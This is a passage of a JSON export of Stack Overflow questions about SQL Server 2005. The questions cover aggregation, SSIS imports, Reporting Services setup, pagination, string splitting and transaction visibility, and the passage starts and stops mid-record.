s.fips\njoin vendorserviceareaentries vsae on vsae.fips = c.fips\njoin vendorserviceareas vsa on vsae.vendorserviceareaid = vsa.vendorserviceareaid \n\n\n)a\nGROUP BY State1, County\nOrder BY State1, County\n</code></pre>\n\n<p>the additional tables i have added have the following columns (using abbreviations from query) vsa column 1 = serviceareaid (numerical ID), column 2 = vendorid (numerical id) column 3 =  description(text to describe area of service) (varchar(50)) </p>\n\n<p>the other table vsae has the following columns, column 1 = serviceareaid - same as above table, fips = county code (FK char (5)), and postal code (char (5))</p>\n\n<p>and for some more info each service are could be called \"california\" or somehting like that, the system then has each state, then county, then postal codes within each county listed for a service area, this is where most of my issue is lying because i can get any number of postal codes per county so im getting a false count for what im trying to do.</p>\n\n<p>My ultimate goal is to find out per county how many vendors i have without taking into account the postal codes of a county.</p>\n"},{"tags":["sql-server-2005"],"answer_count":5,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":1163,"score":0,"question_id":451132,"title":"Sql Server Reporting Service without Full SQL Server","body":"<p>I am going to use SSRS to generate report for my website.\n<br>\nScenario:\n<br>\nI have 2 servers, Application server &amp; Database Server.\nI want to have reports(.rdl files) sitting on Application server(IIS) accessing data on SQL server(Database Server)</p>\n\n<p>In order to fulfil these requirement I require to install SQL server 2k5 on my Application server just for having SQL server reporting service. So I am just waisting one of licence of SQL server by installing that on Application server.</p>\n\n<p>Is anyone having any idea how to install only reporting service with SQL server 2k5??</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":59,"score":4,"question_id":12221466,"title":"SQL update with aggregate in WHERE clause","body":"<p>I'm trying to set the date field for column date to let's say '10/11/2012' in table 1 when the sum of all amounts table 2 related to that id (via fk_id) = 0. Here's what I mean:</p>\n\n<p>FROM:</p>\n\n<p>table 1    </p>\n\n<pre><code>    id    date\n    1     10/11/2011\n    2      \n    3     10/12/2011\n</code></pre>\n\n<p>table 2</p>\n\n<pre><code>    fk_id    amount\n    1     200\n    2     0\n    2     0\n    3     100\n</code></pre>\n\n<p>TO:</p>\n\n<p>table 1    </p>\n\n<pre><code>    id    date\n    1     10/11/2011\n    2     10/11/2012\n    3     10/12/2011\n</code></pre>\n\n<p>table 2</p>\n\n<pre><code>    fk_id    amount\n    1     200\n    2     0\n    2     0\n    3     100\n</code></pre>\n\n<p>This is what I have currently:</p>\n\n<pre><code>update table1\nset date = '10/11/2012\nFROM table1 inner join table 2 on table1.id = table2.fk_id\nHAVING sum(table2.amount) = 0\n</code></pre>\n\n<p>Can someone help me out here?</p>\n"},{"tags":["sql","sql-server","sql-server-2005","ssis"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":98,"score":1,"question_id":12219200,"title":"OleDB Destination executes full rollback on error, Bulk Insert Task doesn't","body":"<p>I'm using SSIS and BIDS to process a text file who contains lots (millions) of records. I decided to use the Bulk Insert Task and it worked great but then the destination table needed an additional column with a default value on the insert operation and the Bulk Insert Task stopped working. After that, I decided to use a Derived Column with the defaul value and an OleDB Destination to insert the bulk data. It solved my last problem but generated a new one: If there is an error when inserting the data in the OleDB Destination, then it executes a full rollback and no row was added on my table, but when I used the Bulk Insert Task, there were rows based in the BatchSize configuration. Let me explain it with a sample:</p>\n\n<ul>\n<li>I use a text file with 5000 lines. The file contained a duplicate id (intentionally) between the rows 3000 and 4000.</li>\n<li>Before starting the DTS, the destination table was totally empty.</li>\n<li>Using Bulk Insert Task, after the error raised (and the DTS stopped), the destination table had 3000 rows. I set the <em>BatchSize</em> attribute to 1000.</li>\n<li>Using OleDB Destination, after the error raised, the destination table had 0 rows! I set the <em>Rows per batch</em> attribute to 1000 and the <em>Maximum insert commit size</em> to its max value: 2147483647. I tried changing last one to 0, no effect.</li>\n</ul>\n\n<p>Is this the normal behavior of OleDB Destination? Can someone provide me a guide about working with these tasks? Should I forget to use these tasks and use the <a href=\"http://msdn.microsoft.com/es-es/library/ms188365%28v=sql.90%29.aspx\" rel=\"nofollow\">Bulk Insert</a> from T-SQL?</p>\n\n<p>As a side note, I also tried following the instructions for <code>KEEPNULLS</code> in <a href=\"http://msdn.microsoft.com/en-us/library/ms187887.aspx\" rel=\"nofollow\">Keep Nulls or UseDefault Values During Bulk Import (SQL Server)</a> to not use the OleDB Destination task, but it didn't work (maybe is just me).</p>\n\n<hr>\n\n<p>EDIT: Additional info about the problem.</p>\n\n<p>Table structure (sample)</p>\n\n<p>Table T</p>\n\n<pre><code>id int, name varchar(50), processed int default 0\n</code></pre>\n\n<p>CSV File (sample)</p>\n\n<pre><code>1, hello\n2, world\n</code></pre>\n"},{"tags":["sql","sql-server-2005"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":12216716,"title":"How to combine an aggregate sql query and a normal query?","body":"<p>I have a table in SQL Server 2005 that I want to aggregate data from, here is an example.</p>\n\n<pre><code>JobName       ProductionCounter       StartDate             EndDate               CounterName        Stage\n----------------------------------------------------------------------------------------------------------\n\n200           23                      2012-08-30 13:45:00                          Kilograms          Final\n200           2                       2012-08-30 13:45:00                          Bars               Final\n    [...]\n200           46                      2012-08-30 13:45:00   2012-08-30 17:23:00    Kilograms          Final\n200           4                       2012-08-30 13:45:00   2012-08-30 17:23:00    Bars               Final\n300           20                      2012-08-30 13:45:00                          Kilograms          1st\n300           10                      2012-08-30 18:12:00                          Bars               1st\n    [...]\n300           40                      2012-08-30 18:12:00   2012-08-30 19:17:00    Kilograms          1st\n300           20                      2012-08-30 18:12:00   2012-08-30 19:17:00    Bars               1st\n</code></pre>\n\n<p>I want to format this into the following</p>\n\n<pre><code>JobName      TotalKilos       TotalBars       StartDate             EndDate               Stage\n-----------------------------------------------------------------------------------------------\n200          69               6               2012-08-30 13:45:00   2012-08-30 17:23:00   Final\n300          60               30              2012-08-30 18:12:00   2012-08-30 19:17:00   1st\n</code></pre>\n\n<p>This has made me realise I know nothing about SQL. I have tried the following as a start</p>\n\n<pre><code>SELECT JobName, SUM(ProductionCounter)\nFROM vwOeeInterval\nWHERE (CounterName = 'Kilos')\nGROUP BY JobName\n\nSELECT JobName, SUM(ProductionCounter)\nFROM vwOeeInterval\nWHERE (CounterName = 'Bars')\nGROUP BY JobName\n</code></pre>\n\n<p>My questions are:</p>\n\n<ol>\n<li><p>How do I combine these into one query?</p></li>\n<li><p>How would I query for the columns such as <code>StartDate</code> and <code>Stage</code>? Especially where the <code>EndDate</code> is not filled in until the job completes?</p></li>\n</ol>\n\n<p>Any pointers would be much appreciated.</p>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":20,"score":1,"question_id":12217740,"title":"when parameter value is omitted in stored procedure, want it to display for all values","body":"<p>in a stored procedure, when a parameter value is not specified, i want it to display result for all values in the column.</p>\n\n<p>I tried the code as below but if I leave blank the parameter field1 while executing it, it doesn't work and asks to supply the field1 value.</p>\n\n<pre><code>create procedure procedurename\ndeclare @startdate datetime, @enddate endtime, @field1 varchar(15)\n\nselect * from table1\nwhere field1 = @xyz or @xyz is null\nand date between @startdate and @enddate\n\nexecute procedurename @startdate = '01/07/2012', @enddate = '31/07/2012'\n</code></pre>\n\n<p><em>[i omitted field1 value so that it should display result for all values in field1 column between the two dates]</em> but it asks for parameter value.</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005","sql-update"],"answer_count":6,"favorite_count":13,"up_vote_count":37,"down_vote_count":0,"view_count":71451,"score":37,"question_id":982919,"title":"SQL update query using joins","body":"<p>I have to update a field with a value which is returned by a join of 3 tables.</p>\n\n<p>Example: </p>\n\n<pre><code>select\n    im.itemid\n    ,im.sku as iSku\n    ,gm.SKU as GSKU\n    ,mm.ManufacturerId as ManuId\n    ,mm.ManufacturerName\n    ,im.mf_item_number\n    ,mm.ManufacturerID\nfrom \n    item_master im, group_master gm, Manufacturer_Master mm \nwhere\n    im.mf_item_number like 'STA%'\n    and im.sku=gm.sku\n    and gm.ManufacturerID = mm.ManufacturerID\n    and gm.manufacturerID=34\n</code></pre>\n\n<p>I want to update the mf_item_number field values of table master with some  other value which is joined in the above condition.</p>\n\n<p>How to frame the SQL ?</p>\n"},{"tags":["sql-server-2005"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":811,"score":1,"question_id":733587,"title":"How to delete a stubborn SQL 2005 Maintenance Plan","body":"<p>Our SQL 2005 server has a Maintenance Plan that cannot be deleted. </p>\n\n<p>When I try and delete it via Management Studio I get the following error:</p>\n\n<blockquote>\n  <p>An exception occurred while executing\n  a Transact-SQL statement or batch.\n  (Microsoft.SqlServer.ConnectionInfo)\n  -> The SELECT permission was denied on the object 'sysmaintplan_plans',\n  database 'msdb', schema 'dbo'.\n  (Microsoft SQL Server, Error: 229)</p>\n</blockquote>\n\n<p>Its SQL 2005 Enterprise Edition version 9.0.3042.0</p>\n\n<p>I have been able to modify the plan so that it doesn't do anything, but I can't rename it or delete it.</p>\n\n<p>I have a hunch that this might be something to do with Service Pack 2, as the Maintenance Plan may have been created before SP2 was applied, and I've heard some people had problems with that scenario.</p>\n\n<p>edit: I am logged in as sa</p>\n"},{"tags":["sql","sql-server-2005","join","aggregate"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12216240,"title":"How to combine an aggregate SQL query and normal query?","body":"<p>I have a table in SQL 2005 that I want to aggregate data from, here is an example.</p>\n\n<pre><code>JobName       ProductionCounter       StartDate             EndDate               CounterName        Stage\n----------------------------------------------------------------------------------------------------------\n\n200           23                      2012-08-30 13:45:00                          Kilograms          Final\n200           2                       2012-08-30 13:45:00                          Bars               Final\n    [...]\n200           46                      2012-08-30 13:45:00   2012-08-30 17:23:00    Kilograms          Final\n200           4                       2012-08-30 13:45:00   2012-08-30 17:23:00    Bars               Final\n300           20                      2012-08-30 13:45:00                          Kilograms          1st\n300           10                      2012-08-30 18:12:00                          Bars               1st\n    [...]\n300           40                      2012-08-30 18:12:00   2012-08-30 19:17:00    Kilograms          1st\n300           20                      2012-08-30 18:12:00   2012-08-30 19:17:00    Bars               1st\n\nI want to format this into the following\n\n\nJobName      TotalKilos       TotalBars       StartDate             EndDate               Stage\n-----------------------------------------------------------------------------------------------\n\n200          69               6               2012-08-30 13:45:00   2012-08-30 17:23:00   Final\n300          60               30              2012-08-30 18:12:00   2012-08-30 19:17:00   1st\n</code></pre>\n\n<p>This has made me realise I know nothing about SQL.  I have tried the following as a start</p>\n\n<pre><code>SELECT JobName, SUM(KiloCounter)\nFROM vwOeeInterval\nGROUP BY JobName\n\nSELECT JobName, SUM(BarCounter)\nFROM vwOeeInterval\nGROUP BY JobName\n</code></pre>\n\n<p>My questions are:</p>\n\n<ol>\n<li><p>How do I combine these into one query?</p></li>\n<li><p>How would I query for the columns such as StartDate and Stage?  Especially where the End Date\nis not filled in until the job completes?</p></li>\n</ol>\n\n<p>Any pointers would be much appreciated.</p>\n"},{"tags":["sql","sql-server-2005","ssis","data-conversion"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":78,"score":2,"question_id":12207019,"title":"SSIS User-Defined Types","body":"<p>We are trying to import data into our SQL 2005 database from flat files using SSIS packages.</p>\n\n<p>Our database has a CLR User-Defined Type that we use to hold some related information, lets call it dbo.CustomType.</p>\n\n<p>To create an object of dbo.CustomType in SQL, I can do the following:</p>\n\n<pre><code>DECLARE @Decimal1   DECIMAL(18,6),\n        @Int1       INT,\n        @Decimal2   DECIMAL(18,6),\n        @Int2       INT,\n        @Decimal3   DECIMAL(18,6)\n\n\nSELECT  @Decimal1   = 1.5,\n        @Int1       = 1,\n        @Decimal2   = 2.5,\n        @Int2       = 2,\n        @Decimal3   = 3\n\n\n\nSELECT \n    CONVERT(\n                dbo.CustomType,\n                CONVERT(VARCHAR(20), @Decimal1) + ';' + \n                CONVERT(VARCHAR(20), @Decimal2) + ':' +\n                CONVERT(VARCHAR(2), @Int1) + ';' +\n                CONVERT(VARCHAR(20), @Decimal3) + ':' +\n                CONVERT(VARCHAR(2),  @Int2)\n            )\n</code></pre>\n\n<p>In SSIS I have a dataset that has all of the columns represetend by the variables, but how can I combine them and convert them to dbo.CustomType?</p>\n\n<p>====</p>\n\n<p>UPDATE:</p>\n\n<p>I was able to insert the custom type when using an insert statement inside a OLE DB Command object instead of the OLE DB Destination.</p>\n\n<p>SO:</p>\n\n<pre><code>INSERT INTO Greg\nVALUES (CONVERT(dbo.CustomType, '1;1:1;1:1;'))\n</code></pre>\n\n<p>works, BUT</p>\n\n<pre><code>INSERT INTO Greg\nVALUES (Convert(dbo.Customtype, ?))\n</code></pre>\n\n<p>gives an error</p>\n\n<p>[OLE DB Command [3103]] Error: SSIS Error Code DTS_E_OLEDBERROR.  An OLE DB error has occurred. Error code: 0x80040E21.\nAn OLE DB record is available.  Source: \"Microsoft SQL Server Native Client 10.0\"  Hresult: 0x80040E21  Description: \"Invalid character value for cast specification\".</p>\n\n<p>It seems to be trying to convert my string column to byte stream, but whenever I try to change Param_0 to String in the advanced editor it keeps changing back to byte stream</p>\n"},{"tags":["sql-server-2005","replication"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":720,"score":0,"question_id":1724322,"title":"Where is the log file located when verbose history logging is turned on for SQL 2005 replication?","body":"<p>I keep getting the The merge process was unable to create a new generation at the 'Subscriber'. Troubleshoot by restarting the synchronization with verbose history logging and specify an output file to which to write. (Source: MSSQL_REPL, Error number: MSSQL_REPL-2147200994)\nGet help: <a href=\"http://help/MSSQL%5FREPL-2147200994\" rel=\"nofollow\">http://help/MSSQL%5FREPL-2147200994</a> message.  I went ahead and followed the advice and from the Replication monitor->Agent Profile I changed the profile to Verbose history. Now, where is this file located?  There are not properties in Management studion to sepeify the location. Thank you. </p>\n"},{"tags":["sql-server-2005","unique-key"],"answer_count":4,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":826,"score":4,"question_id":5982933,"title":"SQL Server 2005 unique key with null value","body":"<p>I have a table in SQL Server 2005 with a foreign key, and I want that foreign key to be a unique value or null. I've set it up as a unique key, but it won't allow me to have multiple nulls in the same table. Is it possible to do what I want?</p>\n"},{"tags":["c#","asp.net",".net","sql-server-2005","iis6"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":85,"score":1,"question_id":12205267,"title":"HttpException not being caught","body":"<p>I have this exception:</p>\n\n<pre><code>Server Error in '/datalab' Application.\n\nRequest timed out.\n\nDescription: An unhandled exception occurred during the execution of the current web request. Please review the stack trace for more information about the error and where it originated in the code. \n\nException Details: System.Web.HttpException: Request timed out.\n\nSource Error: \n\nAn unhandled exception was generated during the execution of the current web request. Information regarding the origin and location of the exception can be identified using the exception stack trace below.\n\nStack Trace: \n\n\n[HttpException (0x80004005): Request timed out.]\n</code></pre>\n\n<p>But I added a Global.asax file to my /datalab and /datalab/powerstats directories (the datalab directory is the root while the page being timed out is datalab/powerstats/output.aspx):</p>\n\n<pre><code>&lt;%@ Application Language=\"C#\" %&gt;\n\n&lt;script runat=\"server\"&gt;\n\n\n\nvoid Application_Error(object sender, EventArgs e) \n{ \n    Exception exc = Server.GetLastError();\n\n  // Handle HTTP errors\n  if (exc.GetType() == typeof(HttpException))\n  {\n  Response.Write(\"&lt;h2&gt;Global Page Error&lt;/h2&gt;\\n\");\n\n        // The Complete Error Handling Example generates\n        // some errors using URLs with \"NoCatch\" in them;\n        // ignore these here to simulate what would happen\n        // if a global.asax handler were not implemented.\n        if (exc.Message.Contains(\"NoCatch\") || exc.Message.Contains(\"maxUrlLength\"))\n            return;\n\n        //Redirect HTTP errors to HttpError page\n        //Server.Transfer(\"HttpErrorPage.aspx\");\n        return;\n    }\n\n\n}\n\n\n\n&lt;/script&gt;\n</code></pre>\n\n<p>How do I catch this exception? Why isn't it being caought?</p>\n"},{"tags":["sql-server","sql-server-2005","xp-cmdshell"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":41,"score":1,"question_id":12203245,"title":"Why do I get an error with sql cmdshell when it works in the actual shell?","body":"<p>I run the following:</p>\n\n<pre><code>EXEC XP_CMDSHELL 'fsutil fsinfo volumeinfo C:'\n</code></pre>\n\n<p>returns \n    Error:  The filename, directory name, or volume label syntax is incorrect.\n    NULL\n    NULL</p>\n\n<p>However, hitting the D: drive works just fine.  Also if I just run <code>fsutil fsinfo volumeinfo C:</code> from DOS prompt (e.g. regular command shell) - that works fine too.</p>\n\n<p>What am I missing here?</p>\n"},{"tags":["sql","sql-server-2005","loops","split"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":947,"score":0,"question_id":9980695,"title":"split select results (one column) into multiple columns","body":"<p>I've been trying to work out how to accomplish this, but I think I just don't have the skills to know what to look for in the first place. I'm working with an existing system, and I cannot alter the database schema, nor can I dictate how the users enter data. I have to work with what we have.</p>\n\n<p>Currently, our user is putting stats data into one text field in a table. They are using a standard format of one stat per line, with text qualifiers to 'delimit' the details of the stat. i.e.</p>\n\n<pre><code>&lt;Category&gt; - D:&lt;Description&gt; Q:&lt;Quanitity&gt; V:&lt;Value&gt;\n&lt;Category&gt; - D:&lt;Description&gt; Q:&lt;Quanitity&gt; V:&lt;Value&gt;\n</code></pre>\n\n<p>(there aren't any &lt;> brackets in the actual data... I was just using them to show where details go.)</p>\n\n<p>In the above example, the two stats are held in one text field record... and there are many of these 'stats' records in the table.</p>\n\n<p>Edit: I am using MS SQL Server 2005\nI need to create a report for sums of quanitites/values per description.</p>\n\n<p>I have implemented a split user function that I can use on one record to split each line into individual records... but that is as far as I've managed to get.</p>\n\n<p>I need to 'Select Stats from StatsTable', then loop through each stats record, split it up into individual lines, then extract the category, description, quantity and value from each split line, then return all of the results in one table.</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":12193668,"title":"How can i backup a particular table with table data in SQL server 2005","body":"<p>I want to backup a particular table with table data from a database in SQL Server 2005.\nThanks.</p>\n"},{"tags":["sql-server-2005","pagination","rownumber","rowcount"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":466,"score":2,"question_id":1668069,"title":"Consolidated: SQL 2005+ Dynamic Pagination using SET ROWCOUNT or RowNumber()?","body":"<p>I've a complex SP which applies multiple JOINs and lookup and come complex filters like comma-separated values, etc... On top of it, I've to deploy two complex yet performance-effective features:</p>\n\n<p><strong>1. Dynamic sorting</strong> but I see its limited - you kno the long/clumsy CASE hierarchy, its strange that experts also agree that this is the only 'best' solution we've got:</p>\n\n<p><a href=\"http://stackoverflow.com/questions/149380/dynamic-sorting-within-sql-stored-procedures\">Dynamic Sorting within SQL Stored Procedures</a>\n<a href=\"http://www.sqlteam.com/forums/topic.asp?TOPIC_ID=5942\" rel=\"nofollow\">http://www.sqlteam.com/forums/topic.asp?TOPIC_ID=5942</a></p>\n\n<p>Anyway, I don't expect much on this one for now.</p>\n\n<p><strong>2. Dynamic pagination</strong> - that is I want the SP to be able to return only X number of records (X = page size) starting from Y (Y = page number). I hope you've got the general idea.</p>\n\n<p>To make it more clear I want to use something available in MySQL &amp; PostgreSQL: </p>\n\n<pre><code>[LIMIT { number | ALL }] [OFFSET number]\n</code></pre>\n\n<p><a href=\"http://stackoverflow.com/questions/1545203/database-sql-pagination\">Database: SQL Pagination?</a>\n<a href=\"http://www.sql.org/sql-database/postgresql/manual/queries-limit.html\" rel=\"nofollow\">http://www.sql.org/sql-database/postgresql/manual/queries-limit.html</a></p>\n\n<p><em>Its strange such a simple &amp; basic functionality is NOT available in SQL 2005+ .. or am I wrong (I'd be glad to hear it :-))</em></p>\n\n<hr>\n\n<p>I've known two approaches which suite my performance\\complexity tradeoff - </p>\n\n<p><strong>[2.1] Using the 'RowNumber()' feature of SQL 2005</strong> and then applying filter: (I've used it in past)</p>\n\n<pre><code>WHERE (Row BETWEEN (@PageIndex-1) * @PageSize +1 AND @PageIndex* @PageSize)\n</code></pre>\n\n<p>But again, this needs creating a temp table or using a WITH clause. This is also explained in:\n<a href=\"http://stackoverflow.com/questions/187998/row-offset-in-ms-sql-server\">Row Offset in SQL Server</a></p>\n\n<p><strong>[2.2] I found some new ways.</strong> One of them is using the </p>\n\n<pre><code>SET ROWCOUNT\n</code></pre>\n\n<p><a href=\"http://www.4guysfromrolla.com/webtech/042606-1.shtml\" rel=\"nofollow\">http://www.4guysfromrolla.com/webtech/042606-1.shtml</a></p>\n\n<p><em>And they say that overall 2.2 is effective then 2.1. Is it? Also, I wanted to know what happens if two user-requests trigger the same SP twice simultaneously .. I hope the 'SET ROWCOUNT' won't be 'shared' or 'over-written' among simultaneous SP-calls. Pls confirm.\nAny other points comparing 2.1 &amp; 2.2 ?</em></p>\n"},{"tags":["sql-server","sql-server-2005","ssms"],"answer_count":6,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":2073,"score":4,"question_id":971560,"title":"How to order project solution content in SQL Server Management Studio","body":"<p>In SQL Server Management Studio (SSMS) running against SQL Server 2005, I have a solution which contains a number of views.</p>\n\n<p>These views are not sorted alphabetically.</p>\n\n<p>Can anyone provide either an explanation of why, or a solution to order them alphabetically ?</p>\n"},{"tags":["c#","sql-server-2005","transactions"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":79,"score":1,"question_id":12185070,"title":"Can't immediately see data after committing sql transaction ","body":"<p>Updated for more direct title..</p>\n\n<p>I am having an issue with seeing committed data from my transactions immediately after the commit.</p>\n\n<p>I am accepting data from user input, putting data into the DB (SQL Server 2005) in the form of a parent table with multiple children tables with 1-many relationships. I am using a transaction and committing it when complete. The data is committed to the DB but I immediately run several other queries (<code>SELECT</code> statements only) against the DB after the commit to check to see if all the rows for a group have been entered. These rows can be entered at any time by anyone and are each in their own transaction. So, say the \"group\" has 3 total rows that are required in the database, I want to commit my transaction and then read the DB to see if ANY groups are complete...including that of the transaction I just committed.</p>\n\n<p>The problem is that apparently reading the data back after the commit doesn't bring back the transaction I just committed... if this transaction is the last row in the group then it gets missed by the reads and doesn't return.</p>\n\n<p>So...  </p>\n\n<ul>\n<li>Transaction begins.</li>\n<li>write rows...</li>\n<li>transaction commits..</li>\n<li>read to see if complete groups exist...</li>\n<li>group with current transaction not returned.  other complete groups returned.</li>\n</ul>\n\n<p>One thing to note, submitting another transaction will cause this data to be returned... if this new transaction contains a row to complete another group I do not get the new row returned...</p>\n\n<p>Here is my code.. abbreviated...</p>\n\n<pre><code>SqlConnection sqlConn = getConn();  //getconn is a function that returns a connection object\n\nString sqlSTR = \"&lt;&lt;&lt;MY INSERT STATEMENT&gt;&gt;&gt;\";\nSqlTransaction trans = sqlConn.BeginTransaction(System.Data.IsolationLevel.ReadUncommitted,\"Trans\");\nSqlCommand sqlCMD;\ntry\n{\n    sqlCMD = new SqlCommand(sqlSTR, sqlConn, trans);\n\n    //...Add all my data to the DB.\n\n    trans.Commit();\ncatch (SqlException sqlErr)\n{\n    trans.Rollback(\"Trans\");\n    throw;\n}\nfinally\n{\n    trans.Dispose();\n}\n</code></pre>\n\n<p>Next is some code to read the DB looking for \"completed groups\" but the group this data belongs to, if completed, is not returned.</p>\n\n<p>The data is stored... The data is retrievable by the same code by the next call.. but not here.</p>\n\n<p>It's as if it takes time to commit the transaction by SQL and my reads are called BEFORE it's committed by SQL Server... even though I have the transaction set to allow reads to uncommitted data.</p>\n\n<p>Is there someway to have the commit to wait for completion of the commit BEFORE moving on to other code?</p>\n\n<p>I've tried doing a <code>SELECT @@TRANCOUNT</code> against the connection immediately after the commit but it ALWAYS returns 0.</p>\n\n<p>Thanks!</p>\n\n<p>EDIT:</p>\n\n<pre><code>public static SqlConnection getConn()\n{\n    try\n    {\n        string sqlStr = WebConfigurationManager.ConnectionStrings[\"conn_Main\"].ConnectionString;\n\n        SqlConnection sqlCN = new SqlConnection(sqlStr);\n        sqlCN.Open();\n\n        return sqlCN;\n    }\n    catch\n    {\n        throw;\n    }\n}\n</code></pre>\n\n<p>I'm reading the records after the transaction by using a stored procedure...</p>\n\n<p>In the SP I am using a basic select statement that does a couple of joins and not much else to pull back first a list of \"groups\" that have submissions and then each group individually pulls the individual groups.  It's the 2nd part that doesn't seem to see the records inserted with the transaction...  until the next transaction is committed.</p>\n\n<p>I'm doing some more testing this morning to see if I can tell exactly when the records show up after committing the transaction.</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005","parsing"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":56,"score":1,"question_id":12195504,"title":"Splitting a string then pivoting result","body":"<p>If have a string passed from a .Net application that looks like the below </p>\n\n<pre><code>2023|F66451,1684|648521,1684|600271,2137|019592\n</code></pre>\n\n<p>I have started to parse out the string using the method below but I need to Pivot the data returned from the Split ( surrounded by *'s) function in order to insert into the #tmpExceptions table</p>\n\n<pre><code>DECLARE @ExceptionsList as nvarchar(MAX)\n\nSET @ExceptionsList = '2023|F66451,1684|648521,1684|600271,2137|019592'\n\nSET NOCOUNT ON;\n\nDECLARE @CurrentLineItem as nvarchar(255)\n\nCREATE TABLE #ParsePassOne\n(\n    LineItem nvarchar(255)\n)\n\nCREATE TABLE #tmpExceptions\n(\n    AccountNumber int,\n    ClaimNumber nvarchar(50)\n)\n\nINSERT INTO #ParsePassOne\n    SELECT value FROM Split( ',' ,@ExceptionsList)\n\nWHILE EXISTS(SELECT LineItem FROM #ParsePassOne)\n    BEGIN\n        SELECT TOP 1 @CurrentLineItem = LineItem FROM #ParsePassOne\n\n        *******\n            SELECT value FROM Split( '|' ,@CurrentLineItem) \n            *******\n\n        DELETE FROM #ParsePassOne WHERE LineItem = @CurrentLineItem\n    END\n\nSELECT * FROM #tmpExceptions\n\nDROP TABLE #ParsePassOne\nDROP TABLE #tmpExceptions\n</code></pre>\n\n<p>So far the data returned looks as below. I just need to pivot the data to columns so I can insert it. How do I go about this?</p>\n\n<p><img src=\"http://i.stack.imgur.com/xAHL8.png\" alt=\"enter image description here\"></p>\n\n<p><strong>Split Function</strong></p>\n\n<pre><code>SET ANSI_NULLS ON\nGO\nSET QUOTED_IDENTIFIER ON\nGO\n--Creates an 'InLine' Table Valued Function (TVF)\nALTER FUNCTION [dbo].[Split] \n   (  @Delimiter varchar(5), \n      @List      varchar(8000)\n   ) \n   RETURNS @TableOfValues table \n      (  RowID   smallint IDENTITY(1,1), \n         [Value] varchar(50) \n      ) \nAS \n   BEGIN\n\n      DECLARE @LenString int \n\n      WHILE len( @List ) &gt; 0 \n         BEGIN \n\n            SELECT @LenString = \n               (CASE charindex( @Delimiter, @List ) \n                   WHEN 0 THEN len( @List ) \n                   ELSE ( charindex( @Delimiter, @List ) -1 )\n                END\n               ) \n\n            INSERT INTO @TableOfValues \n               SELECT substring( @List, 1, @LenString )\n\n            SELECT @List = \n               (CASE ( len( @List ) - @LenString ) \n                   WHEN 0 THEN '' \n                   ELSE right( @List, len( @List ) - @LenString - 1 ) \n                END\n               ) \n         END\n\n      RETURN \n\n   END \n</code></pre>\n"},{"tags":["sql-server-2005","inner-join","rownumber"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1057,"score":1,"question_id":2002816,"title":"INNER JOIN And Row_Num() Function Problem","body":"<p>I have  a stored Procedure which do Sorting and Paging like the <a href=\"http://aspnet.4guysfromrolla.com/articles/032206-1.aspx\" rel=\"nofollow\">Sorting Custom Paged Results of</a> of Scott Michell . I have two tables: Article and Category ,My StoredProcedure works fine for Article Table , But i want add a field of Category into queyr (Inner Join I mean )<br>\nActually I can't do  like the Scott Michell has done , Because there are some field that are similar at both Tables .(When i do like Scott all the time i get \"Ambiguous Column Error\")\nMy StoredProcedure without Inner join is :</p>\n\n<pre><code>set ANSI_NULLS ON\nset QUOTED_IDENTIFIER ON\ngo\n\n\nALTER PROCEDURE [dbo].[sp_Articles_SelectByCategoryId]\n @CategoryId int,\n @startRowIndex int = -1,\n @maximumRows int = -1,\n @sortExpression nvarchar(50),\n @recordCount int = NULL OUTPUT\n\nAS\n\nIF (@recordCount IS NOT NULL)\n BEGIN\n  SET @recordCount = (SELECT COUNT(*) FROM [dbo].[Articles] WHERE [CategoryId] = @CategoryId\n )\n  RETURN\n END\n\nIF LEN(@sortExpression) = 0\n   SET @sortExpression = 'Id'\n\nDECLARE @sql nvarchar(4000)\nSET @sql = \n'SELECT\n [Id],\n [AddedDate],\n [AddedBy],\n [CategoryId],\n [Title],\n [Abstract],\n [Body]\n\nFROM\n (SELECT \n\n [Id],\n [AddedDate],\n [AddedBy],\n [CategoryId],\n [Title],\n [Abstract],\n [Body],\n\nROW_NUMBER() OVER(ORDER BY ' + @sortExpression + ') as RowNum\n\n FROM  [dbo].[Articles]\n\n WHERE CategoryId = ' + CONVERT(nvarchar(10), @CategoryId) + '\n ) as CategoryIdInfo\n WHERE \n ((RowNum between (' + CONVERT(nvarchar(10), @startRowIndex) + ') AND ' + CONVERT(nvarchar(10), @startRowIndex) + ' + ' + CONVERT(nvarchar(10), @maximumRows) + ' - 1) \n   OR ' + CONVERT(nvarchar(10), @startRowIndex) + ' = -1 OR ' + CONVERT(nvarchar(10), @maximumRows) + ' = -1)'\n\n  -- Execute the SQL query\n  EXEC sp_executesql @sql\n\n\n--endregion\n</code></pre>\n\n<p>My Category Table is :</p>\n\n<pre><code>CREATE TABLE [dbo].[Category](\n [Id] [int] IDENTITY(1,1) NOT NULL,\n [AddedDate] [datetime] NOT NULL,\n [AddedBy] [nvarchar](250) COLLATE Arabic_CI_AS NOT NULL,\n [Title] 